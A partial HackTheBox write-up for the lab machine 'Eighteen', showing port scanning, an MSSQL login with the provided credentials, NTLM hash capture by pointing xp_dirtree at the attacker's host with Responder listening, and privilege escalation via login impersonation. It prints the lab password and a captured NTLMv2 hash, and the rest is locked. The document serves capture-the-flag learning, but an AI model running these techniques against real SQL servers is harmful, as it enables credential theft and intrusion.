- - - 
created : 20-11-2025 

Tags : #easy 

Released on 15 Nov 2025 (Season 9)
- - - 
# MACHINE INFORMATION

As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: `kevin / iNa2we6haRj2gaw!`
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eighteen/user]
└─$ rustscan -a eighteen.htb -- -A

Open 10.10.11.95:80
Open 10.10.11.95:1433
Open 10.10.11.95:5985

PORT     STATE SERVICE  REASON          VERSION
80/tcp   open  http     syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Welcome - eighteen.htb
|_http-server-header: Microsoft-IIS/10.0

1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100

5985/tcp open  http     syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

Add `dc01.eighteen.htb` to `/etc/hosts` file.
# Enumeration
## HTTP (80)

Login page:

![Pasted image 20251120191111.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251120191111.png)

Register:

![Pasted image 20251120192114.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251120192114.png)

You can enter the admin panel with [SQL Injection](../../../3%20-%20Tags/Hacking%20Concepts/SQL%20Injection.md), but the website is a distraction trap (rabbit hole) .
## MSSQL

Use `impacket` to get a shell with the given credentials:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Eighteen/user]
└─$ impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@eighteen.htb              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands

SQL (kevin  guest@master)> enum_db      
name                is_trustworthy_on   
-----------------   -----------------   
master                              0   
tempdb                              0   
model                               0   
msdb                                1   
financial_planner                   0   

SQL (kevin  guest@master)> enum_links 
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (kevin  guest@master)> enable_xp_cmdshell  
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (kevin  guest@master)> use financial_planner
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context. 

SQL (kevin  guest@master)> select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
login    login_type   password_hash   create_date   modify_date   status     
------   ----------   -------------   -----------   -----------   --------   
appdev   SQL_LOGIN             NULL   2025-09-12 01:38:53   2025-11-20 15:05:57   b'Enabled'   
kevin    SQL_LOGIN             NULL   2025-09-12 01:38:48   2025-11-20 17:28:05   b'Enabled'   
sa       SQL_LOGIN             NULL   2003-04-08 09:10:35   2025-11-20 15:39:12   b'Enabled' 
```

Try steal **NTLM** with `xp_dirtree`:

```bash
SQL (kevin  guest@master)> exec master.dbo.xp_dirtree '\\10.10.14.21\test'
subdirectory   depth   
------------   -----  
```

Check listener:

```bash
└─$ sudo responder -I tun0
[SMB] NTLMv2-SSP Hash     : mssqlsvc::EIGHTEEN:bbb6757ee929ace9:08E711AC6F089EE8784C20A6EA162386:01010000000000008028C408575ADC01406A1BAF21EAA6950000000002000800540034004600560001001E00570049004E002D003600440030005A004C0042004100420050003600410004003400570049004E002D003600440030005A004C004200410042005000360041002E0054003400460056002E004C004F00430041004C000300140054003400460056002E004C004F00430041004C000500140054003400460056002E004C004F00430041004C00070008008028C408575ADC01060004000200000008003000300000000000000000000000003000001A47CC23DCE6B1E658107E2C17E6F525AA33DABD659861798D54D657A9751C590A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320031000000000000000000     
```

Can't crack it.
# Exploit

With this SQL command we check if we can impersonate another user:

```bash
SQL (kevin  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'         
name                                                                                                   
------   
appdev   
```

Or just use `enum_impersonate`:

```bash
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev   
```

So we can impersonate `appdev`:

```bash
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev'

SQL (appdev  appdev@master)> SELECT SYSTEM_USER
------                                                                                                 
appdev                                                                                                 
SQL (appdev  appdev@master)> SELECT IS_SRVROLEMEMBER('sysadmin')                                       
-                                                                                                      
0                              
```

We check `xp_cmdshell`:

```bash
SQL (appdev  appdev@master)> EXEC sp_helprotect 'xp_cmdshell'
Owner   Object        Grantee   Grantor   ProtectType   Action    Column   
-----   -----------   -------   -------   -----------   -------   ------   
sys     xp_cmdshell   appdev    dbo       b'Grant     '   Execute   .  

SQL (appdev  appdev@master)> sp_configure 'xp_cmdshell', '1'
ERROR(DC01): Line 105: User does not have permission to perform this action.

SQL (appdev  appdev@master)> RECONFIGURE
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

# 🔒 Locked Content

This machine is currently an **Active Box** on HackTheBox, according to the platform policies the write-up will be disclosed to the public after it's retirement.

If you need full access to guides and scripts, support the project on [Buy Me a Coffee](https://buymeacoffee.com/mdn0x)